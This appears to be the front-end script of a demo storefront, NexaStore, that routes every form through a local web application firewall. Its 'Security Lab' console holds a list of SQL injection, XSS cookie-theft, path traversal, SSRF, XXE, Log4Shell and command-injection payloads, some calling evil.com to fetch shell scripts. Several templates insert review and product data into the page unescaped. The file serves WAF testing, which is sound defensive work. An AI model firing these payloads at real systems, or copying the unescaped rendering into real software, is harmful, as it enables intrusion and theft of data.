/* ═══════════════════════════════════════════════════════════════════════════
   NexaStore — Full Interactive App + Security Lab
   ═══════════════════════════════════════════════════════════════════════════
   ALL user-submitted forms route through the WAF (port 8000).
   This lets you manually type attack payloads in any form field
   and watch the WAF catch them in real-time.
   ═══════════════════════════════════════════════════════════════════════════ */

const WAF = "http://localhost:8000";  // All requests go through CloudFort
let currentPage = "home";
let cart = [];
let loggedInUser = null;

// ═══════════════════════════════════════════════════════════════════════════
// SPA ROUTER
// ═══════════════════════════════════════════════════════════════════════════

function navigate(page, data) {
  currentPage = page;
  // Update active nav link
  document.querySelectorAll(".nav-link").forEach(l => l.classList.toggle("active", l.dataset.page === page));
  // Scroll up
  window.scrollTo({ top: 0, behavior: "smooth" });
  // Render
  const content = document.getElementById("app-content");
  switch (page) {
    case "home":      content.innerHTML = renderHome(); break;
    case "products":  content.innerHTML = renderProducts(); loadProducts(); break;
    case "product":   content.innerHTML = '<div class="section"><p style="color:var(--text-muted)">Loading...</p></div>'; loadProductDetail(data); break;
    case "search":    content.innerHTML = '<div class="section"><p style="color:var(--text-muted)">Searching...</p></div>'; doSearch(data); break;
    case "login":     content.innerHTML = renderLogin(); break;
    case "register":  content.innerHTML = renderRegister(); break;
    case "cart":      content.innerHTML = renderCart(); break;
    case "contact":   content.innerHTML = renderContact(); break;
    case "checkout":  content.innerHTML = renderCheckout(); break;
    default:          content.innerHTML = renderHome();
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// PAGE RENDERERS
// ═══════════════════════════════════════════════════════════════════════════

function renderHome() {
  return `
    <section class="hero">
      <div class="hero-bg"></div>
      <div class="hero-content">
        <div class="hero-badge">🔥 New Arrivals</div>
        <h1 class="hero-title">Premium Tech<br/><span class="gradient-text">At Your Fingertips</span></h1>
        <p class="hero-subtitle">Discover cutting-edge electronics and accessories with fast shipping and easy returns.</p>
        <div class="hero-actions">
          <button class="btn-primary-lg" onclick="navigate('products')">Browse Products</button>
          <button class="btn-secondary-lg" onclick="document.getElementById('nav-search').focus()">Search Catalog</button>
        </div>
        <div class="hero-stats">
          <div class="hero-stat"><span class="stat-number">10K+</span><span class="stat-label">Products</span></div>
          <div class="hero-stat"><span class="stat-number">50K+</span><span class="stat-label">Customers</span></div>
          <div class="hero-stat"><span class="stat-number">4.9★</span><span class="stat-label">Rating</span></div>
        </div>
      </div>
    </section>
    <hr class="section-divider"/>
    <div class="section">
      <h2 class="section-title">Featured Products</h2>
      <p class="section-subtitle">Handpicked by our team for exceptional quality</p>
      <div class="products-grid" id="featured-grid">
        <div style="color:var(--text-muted); font-size:13px;">Loading...</div>
      </div>
    </div>
    <hr class="section-divider"/>
    <div class="section">
      <h2 class="section-title">Leave a Review</h2>
      <p class="section-subtitle">Share your experience with our products</p>
      <div style="max-width:560px;">
        <form onsubmit="handleReview(event)">
          <div class="form-group">
            <label class="form-label">Your Name</label>
            <input type="text" id="review-name" class="form-input" placeholder="e.g. John Doe" />
          </div>
          <div class="form-group">
            <label class="form-label">Product ID</label>
            <input type="text" id="review-pid" class="form-input" placeholder="e.g. 1" />
          </div>
          <div class="form-group">
            <label class="form-label">Your Review</label>
            <textarea id="review-text" class="form-input form-textarea" placeholder="Write your honest review..."></textarea>
          </div>
          <button type="submit" class="btn-primary" style="width:auto; padding:12px 32px;">Submit Review</button>
        </form>
        <div id="review-result" class="form-feedback"></div>
      </div>
    </div>
  `;
}

function renderProducts() {
  return `
    <div class="section">
      <h2 class="section-title">All Products</h2>
      <p class="section-subtitle">Browse our complete catalog</p>
      <div style="display:flex; gap:8px; margin-bottom:24px; flex-wrap:wrap;">
        <button class="btn-outline active-filter" data-cat="" onclick="filterProducts('')">All</button>
        <button class="btn-outline" data-cat="electronics" onclick="filterProducts('electronics')">Electronics</button>
        <button class="btn-outline" data-cat="accessories" onclick="filterProducts('accessories')">Accessories</button>
        <button class="btn-outline" data-cat="gaming" onclick="filterProducts('gaming')">Gaming</button>
        <button class="btn-outline" data-cat="home office" onclick="filterProducts('home office')">Home Office</button>
      </div>
      <div class="products-grid" id="all-products-grid">
        <div style="color:var(--text-muted); font-size:13px;">Loading products...</div>
      </div>
    </div>
  `;
}

function renderLogin() {
  if (loggedInUser) return renderProfile();
  return `
    <div class="section" style="display:flex; justify-content:center; padding-top:80px;">
      <div class="form-card">
        <div class="form-title">👤 Sign In</div>
        <div class="form-subtitle">Enter your credentials to access your account</div>
        <form onsubmit="handleLogin(event)">
          <div class="form-group">
            <label class="form-label">Username</label>
            <input type="text" id="login-user" class="form-input" placeholder="Enter your username" autocomplete="off" />
          </div>
          <div class="form-group">
            <label class="form-label">Password</label>
            <input type="password" id="login-pass" class="form-input" placeholder="Enter your password" />
          </div>
          <button type="submit" class="btn-primary" id="login-submit-btn">Sign In</button>
        </form>
        <div id="login-result" class="form-feedback"></div>
        <div style="text-align:center; margin-top:20px;">
          <span class="form-link" onclick="navigate('register')">Don't have an account? Register</span>
        </div>
        <div style="text-align:center; margin-top:8px;">
          <span class="form-link" onclick="handleForgotPassword()">Forgot password?</span>
        </div>
        <div id="forgot-result" class="form-feedback"></div>
      </div>
    </div>
  `;
}

function renderRegister() {
  return `
    <div class="section" style="display:flex; justify-content:center; padding-top:80px;">
      <div class="form-card">
        <div class="form-title">📝 Create Account</div>
        <div class="form-subtitle">Join NexaStore and start shopping</div>
        <form onsubmit="handleRegister(event)">
          <div class="form-group">
            <label class="form-label">Username</label>
            <input type="text" id="reg-user" class="form-input" placeholder="Choose a username" autocomplete="off" />
          </div>
          <div class="form-group">
            <label class="form-label">Email</label>
            <input type="email" id="reg-email" class="form-input" placeholder="your@email.com" autocomplete="off" />
          </div>
          <div class="form-group">
            <label class="form-label">Password</label>
            <input type="password" id="reg-pass" class="form-input" placeholder="Create a strong password" />
          </div>
          <button type="submit" class="btn-primary">Create Account</button>
        </form>
        <div id="register-result" class="form-feedback"></div>
        <div style="text-align:center; margin-top:20px;">
          <span class="form-link" onclick="navigate('login')">Already have an account? Sign In</span>
        </div>
      </div>
    </div>
  `;
}

function renderProfile() {
  return `
    <div class="section" style="display:flex; justify-content:center; padding-top:80px;">
      <div class="form-card" style="text-align:center;">
        <div style="font-size:48px; margin-bottom:16px;">👤</div>
        <div class="form-title">${loggedInUser.username}</div>
        <div class="form-subtitle">${loggedInUser.email}</div>
        <div style="margin:20px 0; padding:16px; background:rgba(255,255,255,0.03); border-radius:var(--radius-sm);">
          <div style="font-size:11px; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.1em;">Role</div>
          <div style="font-size:14px; font-weight:600; color:var(--accent); margin-top:4px;">${loggedInUser.role}</div>
        </div>
        <button class="btn-danger" onclick="handleLogout()" style="width:100%;">Sign Out</button>
      </div>
    </div>
  `;
}

function renderCart() {
  if (cart.length === 0) {
    return `
      <div class="section" style="text-align:center; padding-top:80px;">
        <div style="font-size:64px; margin-bottom:16px;">🛒</div>
        <h2 class="section-title">Your Cart is Empty</h2>
        <p class="section-subtitle">Add some products to get started!</p>
        <button class="btn-primary-lg" onclick="navigate('products')">Browse Products</button>
      </div>
    `;
  }
  const total = cart.reduce((s, i) => s + i.price * i.qty, 0);
  return `
    <div class="section">
      <h2 class="section-title">Shopping Cart</h2>
      <p class="section-subtitle">${cart.length} item(s)</p>
      <div style="max-width:700px;">
        ${cart.map((item, i) => `
          <div class="cart-item">
            <div class="cart-item-image" style="background:linear-gradient(135deg,${item.gradient || '#667eea,#764ba2'});">${item.image}</div>
            <div class="cart-item-info">
              <div class="cart-item-name">${item.name}</div>
              <div class="cart-item-price">$${item.price.toFixed(2)} × ${item.qty}</div>
            </div>
            <div style="display:flex; gap:6px; align-items:center;">
              <button class="qty-btn" onclick="updateCartQty(${i}, -1)">−</button>
              <span class="qty-value">${item.qty}</span>
              <button class="qty-btn" onclick="updateCartQty(${i}, 1)">+</button>
              <button class="btn-danger" onclick="removeFromCart(${i})" style="margin-left:8px; padding:8px 12px; font-size:11px;">✕</button>
            </div>
          </div>
        `).join("")}
        <div class="cart-summary">
          <div class="cart-total">
            <span>Total</span>
            <span style="color:var(--accent);">$${total.toFixed(2)}</span>
          </div>
          <button class="btn-primary" onclick="navigate('checkout')">Proceed to Checkout</button>
        </div>
      </div>
    </div>
  `;
}

function renderCheckout() {
  const total = cart.reduce((s, i) => s + i.price * i.qty, 0);
  return `
    <div class="section" style="max-width:600px; margin:0 auto;">
      <h2 class="section-title">Checkout</h2>
      <p class="section-subtitle">Complete your order — $${total.toFixed(2)} total</p>
      <form onsubmit="handleCheckout(event)">
        <div class="form-group">
          <label class="form-label">Full Name</label>
          <input type="text" id="checkout-name" class="form-input" placeholder="John Doe" />
        </div>
        <div class="form-group">
          <label class="form-label">Email</label>
          <input type="email" id="checkout-email" class="form-input" placeholder="john@example.com" />
        </div>
        <div class="form-group">
          <label class="form-label">Shipping Address</label>
          <textarea id="checkout-address" class="form-input form-textarea" placeholder="123 Main St, City, State, ZIP" style="min-height:80px;"></textarea>
        </div>
        <div class="form-group">
          <label class="form-label">Card Number</label>
          <input type="text" id="checkout-card" class="form-input" placeholder="4111 1111 1111 1111" />
        </div>
        <button type="submit" class="btn-primary">Place Order — $${total.toFixed(2)}</button>
      </form>
      <div id="checkout-result" class="form-feedback"></div>
    </div>
  `;
}

function renderContact() {
  return `
    <div class="section">
      <h2 class="section-title">Contact Us</h2>
      <p class="section-subtitle">Have a question? We'd love to hear from you.</p>
      <div class="contact-grid">
        <div>
          <div class="contact-info-card">
            <span class="contact-icon">📧</span>
            <div><div class="contact-label">Email</div><div class="contact-value">support@nexastore.com</div></div>
          </div>
          <div class="contact-info-card">
            <span class="contact-icon">📞</span>
            <div><div class="contact-label">Phone</div><div class="contact-value">+1 (555) 123-4567</div></div>
          </div>
          <div class="contact-info-card">
            <span class="contact-icon">📍</span>
            <div><div class="contact-label">Address</div><div class="contact-value">123 Tech Boulevard, San Francisco, CA 94105</div></div>
          </div>
          <div class="contact-info-card">
            <span class="contact-icon">🕐</span>
            <div><div class="contact-label">Hours</div><div class="contact-value">Mon-Fri: 9AM - 6PM PST</div></div>
          </div>
        </div>
        <div>
          <div class="form-card" style="max-width:100%;">
            <div class="form-title" style="font-size:18px;">Send a Message</div>
            <div class="form-subtitle" style="margin-bottom:20px;">We'll get back to you within 24 hours</div>
            <form onsubmit="handleContact(event)">
              <div class="form-group">
                <label class="form-label">Your Name</label>
                <input type="text" id="contact-name" class="form-input" placeholder="John Doe" />
              </div>
              <div class="form-group">
                <label class="form-label">Email</label>
                <input type="email" id="contact-email" class="form-input" placeholder="john@example.com" />
              </div>
              <div class="form-group">
                <label class="form-label">Subject</label>
                <input type="text" id="contact-subject" class="form-input" placeholder="How can we help?" />
              </div>
              <div class="form-group">
                <label class="form-label">Message</label>
                <textarea id="contact-message" class="form-input form-textarea" placeholder="Describe your issue or question..."></textarea>
              </div>
              <button type="submit" class="btn-primary">Send Message</button>
            </form>
            <div id="contact-result" class="form-feedback"></div>
          </div>
        </div>
      </div>
    </div>
  `;
}

function renderProductCard(p) {
  const gradients = {
    "Electronics": "#667eea,#764ba2",
    "Accessories": "#f093fb,#f5576c",
    "Gaming":      "#4facfe,#00f2fe",
    "Home Office": "#43e97b,#38f9d7",
  };
  const grad = gradients[p.category] || "#667eea,#764ba2";
  return `
    <div class="product-card" onclick="navigate('product', ${p.id})">
      <div class="product-image" style="background:linear-gradient(135deg,${grad});">
        <span class="product-category-tag">${p.category}</span>
        <span class="product-emoji">${p.image}</span>
      </div>
      <div class="product-info">
        <div class="product-name">${p.name}</div>
        <div class="product-desc-short">${p.description}</div>
        <div class="product-footer">
          <span class="product-price">$${p.price.toFixed(2)}</span>
          <span class="product-rating">★ ${p.rating}</span>
        </div>
        <div class="product-stock ${p.stock < 20 ? 'low' : ''}">
          ${p.stock < 20 ? '⚠' : '✓'} ${p.stock} in stock
        </div>
      </div>
    </div>
  `;
}

// ═══════════════════════════════════════════════════════════════════════════
// API CALLS (all go through WAF at port 8000)
// ═══════════════════════════════════════════════════════════════════════════

async function wafFetch(path, options = {}) {
  try {
    const res = await fetch(WAF + path, options);
    const data = await res.json();
    if (res.status === 403) {
      showWafToast("blocked", data);
      return { blocked: true, data, status: res.status };
    }
    if (res.status === 429) {
      showWafToast("blocked", { attack_type: "Rate Limit", reason: data.reason || "Too many requests" });
      return { blocked: true, data, status: res.status };
    }
    return { blocked: false, data, status: res.status };
  } catch (err) {
    return { blocked: false, data: null, status: 0, error: err.message };
  }
}

function showWafToast(type, data) {
  const existing = document.querySelectorAll(".waf-toast");
  existing.forEach(e => e.remove());

  const toast = document.createElement("div");
  toast.className = `waf-toast ${type}`;
  toast.innerHTML = `
    <div class="waf-toast-title">🛡️ CloudFort ${type === "blocked" ? "BLOCKED" : "ALLOWED"}</div>
    <div class="waf-toast-detail">
      ${data.attack_type ? `Attack: ${data.attack_type}` : ""}
      ${data.severity_score ? ` | Score: ${data.severity_score}` : ""}
      ${data.request_id ? `<br/>ID: ${data.request_id}` : ""}
      ${data.reason ? `<br/>Reason: ${data.reason}` : ""}
    </div>
  `;
  document.body.appendChild(toast);
  setTimeout(() => { toast.style.opacity = "0"; toast.style.transform = "translateX(30px)"; setTimeout(() => toast.remove(), 300); }, 4000);
}

// ── Load products ────────────────────────────────────────────────────────

async function loadProducts(category) {
  const cat = category ? `?category=${encodeURIComponent(category)}` : "";
  const { data } = await wafFetch(`/api/products${cat}`);
  const grid = document.getElementById("all-products-grid") || document.getElementById("featured-grid");
  if (!grid) return;
  if (!data || !data.products) { grid.innerHTML = '<p style="color:var(--text-muted)">Failed to load</p>'; return; }
  grid.innerHTML = data.products.map(renderProductCard).join("");
}

function filterProducts(cat) {
  document.querySelectorAll("[data-cat]").forEach(b => {
    b.classList.toggle("active-filter", b.dataset.cat === cat);
    b.style.background = b.dataset.cat === cat ? "rgba(99,102,241,0.15)" : "";
    b.style.color = b.dataset.cat === cat ? "var(--accent)" : "";
    b.style.borderColor = b.dataset.cat === cat ? "rgba(99,102,241,0.3)" : "";
  });
  loadProducts(cat);
}

async function loadProductDetail(id) {
  const { data } = await wafFetch(`/api/products/${id}`);
  const content = document.getElementById("app-content");
  if (!data || !data.product) { content.innerHTML = '<div class="section"><p style="color:var(--danger)">Product not found</p></div>'; return; }
  const p = data.product;
  const reviews = data.reviews || [];
  const gradients = { "Electronics":"#667eea,#764ba2","Accessories":"#f093fb,#f5576c","Gaming":"#4facfe,#00f2fe","Home Office":"#43e97b,#38f9d7" };
  const grad = gradients[p.category] || "#667eea,#764ba2";

  content.innerHTML = `
    <div class="section">
      <button class="btn-outline" onclick="navigate('products')" style="margin-bottom:24px;">← Back to Products</button>
      <div class="product-detail">
        <div class="product-detail-image" style="background:linear-gradient(135deg,${grad});">
          <span class="product-detail-emoji">${p.image}</span>
        </div>
        <div class="product-detail-info">
          <div style="font-size:12px; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.08em;">${p.category}</div>
          <div class="product-detail-name">${p.name}</div>
          <div class="product-detail-price">$${p.price.toFixed(2)}</div>
          <div style="display:flex; align-items:center; gap:10px;">
            <span class="product-rating" style="font-size:14px;">★ ${p.rating}</span>
            <span class="product-stock ${p.stock < 20 ? 'low' : ''}">${p.stock} in stock</span>
          </div>
          <div class="product-detail-desc">${p.description}</div>
          <div class="quantity-selector">
            <button class="qty-btn" onclick="changeDetailQty(-1)">−</button>
            <span class="qty-value" id="detail-qty">1</span>
            <button class="qty-btn" onclick="changeDetailQty(1)">+</button>
          </div>
          <button class="btn-primary-lg" onclick="addToCart(${JSON.stringify(p).replace(/"/g, '&quot;')}, '${grad}')" style="margin-top:8px;">
            🛒 Add to Cart
          </button>
        </div>
      </div>
      <hr class="section-divider" style="margin:32px 0;"/>
      <h3 class="section-title" style="font-size:20px;">Customer Reviews</h3>
      <div style="margin-top:16px;">
        ${reviews.length === 0 ? '<p style="color:var(--text-muted); font-size:13px;">No reviews yet. Be the first!</p>' :
          reviews.map(r => `
            <div class="review-card">
              <div class="review-header">
                <span class="review-user">${r.user}</span>
                <span class="review-date">${r.date}</span>
              </div>
              <div class="review-stars">${'★'.repeat(r.rating)}${'☆'.repeat(5 - r.rating)}</div>
              <div class="review-text">${r.text}</div>
            </div>
          `).join("")
        }
      </div>
      <div style="margin-top:24px; max-width:500px;">
        <h4 style="font-size:15px; margin-bottom:12px;">Write a Review</h4>
        <form onsubmit="handleProductReview(event, ${p.id})">
          <div class="form-group">
            <input type="text" id="prod-review-name" class="form-input" placeholder="Your name" />
          </div>
          <div class="form-group">
            <textarea id="prod-review-text" class="form-input form-textarea" placeholder="Share your thoughts about this product..."></textarea>
          </div>
          <button type="submit" class="btn-primary" style="width:auto; padding:10px 28px;">Submit Review</button>
        </form>
        <div id="prod-review-result" class="form-feedback"></div>
      </div>
    </div>
  `;
}

let detailQty = 1;
function changeDetailQty(d) {
  detailQty = Math.max(1, detailQty + d);
  const el = document.getElementById("detail-qty");
  if (el) el.textContent = detailQty;
}

// ── Cart ─────────────────────────────────────────────────────────────────

function addToCart(product, gradient) {
  const existing = cart.find(i => i.id === product.id);
  if (existing) { existing.qty += detailQty; }
  else { cart.push({ ...product, qty: detailQty, gradient }); }
  detailQty = 1;
  updateCartBadge();
  showWafToast("allowed", { attack_type: "✅ Added to cart", reason: `${product.name} × ${detailQty}` });
}

function updateCartQty(index, delta) {
  cart[index].qty = Math.max(1, cart[index].qty + delta);
  navigate("cart");
}

function removeFromCart(index) {
  cart.splice(index, 1);
  updateCartBadge();
  navigate("cart");
}

function updateCartBadge() {
  const badge = document.getElementById("cart-badge");
  if (badge) badge.textContent = cart.reduce((s, i) => s + i.qty, 0);
}

// ═══════════════════════════════════════════════════════════════════════════
// FORM HANDLERS (all route through WAF)
// ═══════════════════════════════════════════════════════════════════════════

async function handleLogin(e) {
  e.preventDefault();
  const user = document.getElementById("login-user").value;
  const pass = document.getElementById("login-pass").value;
  const result = document.getElementById("login-result");

  const { blocked, data, error } = await wafFetch("/api/auth/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: user, password: pass }),
  });

  if (blocked) {
    result.className = "form-feedback blocked";
    result.innerHTML = `🛡️ CloudFort BLOCKED — ${data?.attack_type || "Attack detected"} (Score: ${data?.severity_score || "N/A"})`;
    return;
  }
  if (error) { result.className = "form-feedback error"; result.textContent = "Connection error: " + error; return; }
  if (data?.status === "success") {
    loggedInUser = data.user;
    document.getElementById("auth-btn").innerHTML = `👤 ${data.user.username}`;
    result.className = "form-feedback success";
    result.textContent = "✓ " + data.message;
    setTimeout(() => navigate("home"), 1000);
  } else {
    result.className = "form-feedback error";
    result.textContent = "✕ " + (data?.message || "Login failed");
  }
}

async function handleRegister(e) {
  e.preventDefault();
  const result = document.getElementById("register-result");
  const { blocked, data, error } = await wafFetch("/api/auth/register", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username: document.getElementById("reg-user").value,
      password: document.getElementById("reg-pass").value,
      email: document.getElementById("reg-email").value,
    }),
  });
  if (blocked) { result.className = "form-feedback blocked"; result.innerHTML = `🛡️ CloudFort BLOCKED — ${data?.attack_type || "Attack"}`; return; }
  if (error) { result.className = "form-feedback error"; result.textContent = error; return; }
  if (data?.status === "success") {
    result.className = "form-feedback success";
    result.textContent = "✓ " + data.message + " — Redirecting to login...";
    setTimeout(() => navigate("login"), 1500);
  } else {
    result.className = "form-feedback error";
    result.textContent = "✕ " + (data?.message || "Registration failed");
  }
}

async function handleForgotPassword() {
  const email = prompt("Enter your email address:");
  if (!email) return;
  const result = document.getElementById("forgot-result");
  const { blocked, data } = await wafFetch("/api/auth/reset-password", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email }),
  });
  if (blocked) { result.className = "form-feedback blocked"; result.innerHTML = `🛡️ BLOCKED`; return; }
  result.className = "form-feedback success";
  result.textContent = "✓ " + (data?.message || "Reset link sent");
}

function handleLogout() {
  loggedInUser = null;
  document.getElementById("auth-btn").innerHTML = "👤 Sign In";
  navigate("home");
}

async function handleReview(e) {
  e.preventDefault();
  const result = document.getElementById("review-result");
  const { blocked, data } = await wafFetch("/api/reviews", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      name: document.getElementById("review-name").value,
      productId: parseInt(document.getElementById("review-pid").value) || 1,
      text: document.getElementById("review-text").value,
      rating: 5,
    }),
  });
  if (blocked) { result.className = "form-feedback blocked"; result.innerHTML = `🛡️ CloudFort BLOCKED — ${data?.attack_type || "Attack"}`; return; }
  result.className = "form-feedback success";
  result.textContent = "✓ " + (data?.message || "Review submitted!");
}

async function handleProductReview(e, productId) {
  e.preventDefault();
  const result = document.getElementById("prod-review-result");
  const { blocked, data } = await wafFetch("/api/reviews", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      name: document.getElementById("prod-review-name").value,
      productId, text: document.getElementById("prod-review-text").value, rating: 5,
    }),
  });
  if (blocked) { result.className = "form-feedback blocked"; result.innerHTML = `🛡️ CloudFort BLOCKED — ${data?.attack_type || "Attack"}`; return; }
  result.className = "form-feedback success";
  result.textContent = "✓ Review submitted!";
  setTimeout(() => navigate("product", productId), 1000);
}

async function handleContact(e) {
  e.preventDefault();
  const result = document.getElementById("contact-result");
  const { blocked, data } = await wafFetch("/api/contact", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      name: document.getElementById("contact-name").value,
      email: document.getElementById("contact-email").value,
      subject: document.getElementById("contact-subject").value,
      message: document.getElementById("contact-message").value,
    }),
  });
  if (blocked) { result.className = "form-feedback blocked"; result.innerHTML = `🛡️ CloudFort BLOCKED — ${data?.attack_type || "Attack"}`; return; }
  result.className = "form-feedback success";
  result.textContent = "✓ " + (data?.message || "Message sent!");
}

async function handleCheckout(e) {
  e.preventDefault();
  const result = document.getElementById("checkout-result");
  const { blocked, data } = await wafFetch("/api/orders", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      items: cart.map(i => ({ id: i.id, name: i.name, price: i.price, qty: i.qty })),
      shippingAddress: document.getElementById("checkout-address").value,
      customerName: document.getElementById("checkout-name").value,
      customerEmail: document.getElementById("checkout-email").value,
      cardNumber: document.getElementById("checkout-card").value,
    }),
  });
  if (blocked) { result.className = "form-feedback blocked"; result.innerHTML = `🛡️ CloudFort BLOCKED — ${data?.attack_type || "Attack"}`; return; }
  if (data?.status === "success") {
    cart = []; updateCartBadge();
    result.className = "form-feedback success";
    result.textContent = `✓ Order ${data.order.id} placed! Total: $${data.order.total.toFixed(2)}`;
  }
}

async function handleNewsletter(e) {
  e.preventDefault();
  const result = document.getElementById("newsletter-result");
  const { blocked, data } = await wafFetch("/api/newsletter", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: document.getElementById("newsletter-email").value }),
  });
  if (blocked) { result.className = "form-feedback blocked"; result.innerHTML = `🛡️ BLOCKED`; return; }
  result.className = "form-feedback success";
  result.textContent = "✓ " + (data?.message || "Subscribed!");
}

// ── Search ───────────────────────────────────────────────────────────────

function doNavSearch() {
  const q = document.getElementById("nav-search").value;
  if (q.trim()) navigate("search", q);
}

document.addEventListener("DOMContentLoaded", () => {
  document.getElementById("nav-search").addEventListener("keydown", (e) => {
    if (e.key === "Enter") doNavSearch();
  });
});

async function doSearch(query) {
  const { blocked, data } = await wafFetch(`/api/search?q=${encodeURIComponent(query)}`);
  const content = document.getElementById("app-content");
  if (blocked) {
    content.innerHTML = `
      <div class="section">
        <div class="search-header">
          <h2 class="section-title">🛡️ Search Blocked by CloudFort</h2>
          <p style="color:var(--danger); font-family:var(--mono); font-size:13px;">
            CloudFort WAF detected a malicious search query: "${escapeHtml(query)}"
          </p>
        </div>
      </div>
    `;
    return;
  }
  const results = data?.results || [];
  content.innerHTML = `
    <div class="section">
      <div class="search-header">
        <h2 class="section-title">Search: <span class="search-query">"${escapeHtml(query)}"</span></h2>
        <p class="search-count">${results.length} result(s) found</p>
      </div>
      <div class="products-grid">
        ${results.length === 0 ? '<p style="color:var(--text-muted)">No products match your search.</p>' : results.map(renderProductCard).join("")}
      </div>
    </div>
  `;
}


// ═══════════════════════════════════════════════════════════════════════════
// SECURITY LAB — Attack Console (kept from before)
// ═══════════════════════════════════════════════════════════════════════════

const ATTACK_PAYLOADS = {
  "SQL Injection": [
    "' OR 1=1 --",
    "' UNION SELECT username, password FROM users --",
    "'; DROP TABLE users; --",
    "' OR '1'='1' /*",
    "1; EXEC xp_cmdshell('whoami')",
    "' AND SLEEP(5) --",
    "admin' --",
    "' UNION SELECT null, LOAD_FILE('/etc/passwd') --",
  ],
  "XSS": [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(document.cookie)>',
    '<svg onload=alert("XSS")>',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert(1) autofocus>',
    '<script>document.write(document.cookie)</script>',
  ],
  "Path Traversal": [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/shadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/proc/self/environ",
    "....\\....\\boot.ini",
  ],
  "Command Injection": [
    "; cat /etc/passwd",
    "| whoami",
    "; ls -la /",
    "$(whoami)",
    "`id`",
    "| bash -c 'curl http://evil.com'",
    "; wget http://evil.com/shell.sh",
    "| powershell -Command Get-Process",
  ],
  "SSRF": [
    "http://localhost:8080/admin",
    "http://127.0.0.1:22",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]:80/",
    "file:///etc/passwd",
    "http://0.0.0.0:8000/waf/stats",
    "gopher://127.0.0.1:25/",
    "http://metadata.google.internal/computeMetadata/v1/",
  ],
  "XXE": [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<!ENTITY xxe SYSTEM "http://evil.com/steal">',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>',
  ],
  "Log4Shell": [
    '${jndi:ldap://evil.com/a}',
    '${jndi:rmi://attacker.com:1099/exploit}',
    '${${lower:j}ndi:${lower:l}dap://evil.com/x}',
  ],
};

let selectedAttack = null;
let selectedPayload = null;
let attackCounter = 0;

function initLab() {
  const grid = document.getElementById("attack-type-grid");
  if (!grid) return;
  const icons = { "SQL Injection":"💉","XSS":"🔴","Path Traversal":"📁","Command Injection":"⌨️","SSRF":"🌐","XXE":"📄","Log4Shell":"🪵" };
  Object.keys(ATTACK_PAYLOADS).forEach((type) => {
    const btn = document.createElement("button");
    btn.className = "attack-type-btn";
    btn.innerHTML = `${icons[type] || "⚠"} ${type}`;
    btn.onclick = () => selectAttackType(type);
    btn.dataset.type = type;
    grid.appendChild(btn);
  });
}

function selectAttackType(type) {
  selectedAttack = type;
  const payloads = ATTACK_PAYLOADS[type];
  selectedPayload = payloads[Math.floor(Math.random() * payloads.length)];
  document.querySelectorAll(".attack-type-btn").forEach(b => b.classList.toggle("active", b.dataset.type === type));
  document.getElementById("payload-preview").textContent = selectedPayload;
}

function toggleLab() { document.getElementById("security-lab").classList.toggle("hidden"); }

async function launchAttack() {
  if (!selectedAttack || !selectedPayload) { addLogEntry("error", "⚠ Select an attack type first", ""); return; }
  const btn = document.getElementById("launch-btn");
  btn.disabled = true; btn.textContent = "⏳ Sending...";
  const endpointRaw = document.getElementById("target-endpoint").value;
  const [method, endpointPath] = endpointRaw.split(":");
  attackCounter++;
  const startTime = performance.now();
  try {
    let res;
    if (method === "GET") {
      res = await fetch(WAF + endpointPath + encodeURIComponent(selectedPayload));
    } else {
      res = await fetch(WAF + endpointPath, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ input: selectedPayload, username: selectedPayload, password: selectedPayload, name: selectedPayload, text: selectedPayload, email: selectedPayload, message: selectedPayload }),
      });
    }
    const elapsed = Math.round(performance.now() - startTime);
    const data = await res.json();
    if (res.status === 403) {
      addLogEntry("blocked", `🛡️ BLOCKED — ${data.attack_type || "Attack"}`, `Score: ${data.severity_score || "N/A"} | ID: ${data.request_id || "N/A"} | ${elapsed}ms\nPayload: ${truncate(selectedPayload, 80)}`);
    } else if (res.status === 429) {
      addLogEntry("blocked", `⏱️ RATE LIMITED`, `${data.reason || "Too many requests"} | ${elapsed}ms`);
    } else {
      addLogEntry("allowed", `✅ ALLOWED — Passed CloudFort`, `Status: ${res.status} | ${elapsed}ms\nPayload: ${truncate(selectedPayload, 80)}`);
    }
  } catch (err) {
    addLogEntry("error", `❌ ERROR — ${err.message}`, "Is CloudFort running on port 8000?");
  } finally {
    btn.disabled = false; btn.textContent = "🚀 Launch Attack";
    const payloads = ATTACK_PAYLOADS[selectedAttack];
    selectedPayload = payloads[Math.floor(Math.random() * payloads.length)];
    document.getElementById("payload-preview").textContent = selectedPayload;
  }
}

function addLogEntry(type, status, detail) {
  const log = document.getElementById("attack-log");
  const placeholder = log.querySelector(".log-placeholder");
  if (placeholder) placeholder.remove();
  const entry = document.createElement("div");
  entry.className = `log-entry ${type}`;
  entry.innerHTML = `<div class="log-status">${status}</div><div class="log-detail"><span style="color:rgba(255,255,255,0.3)">[${new Date().toLocaleTimeString()}] #${attackCounter}</span><br/>${escapeHtml(detail)}</div>`;
  log.prepend(entry);
  while (log.children.length > 50) log.removeChild(log.lastChild);
}

function truncate(s, m) { return s.length > m ? s.substring(0, m) + "…" : s; }
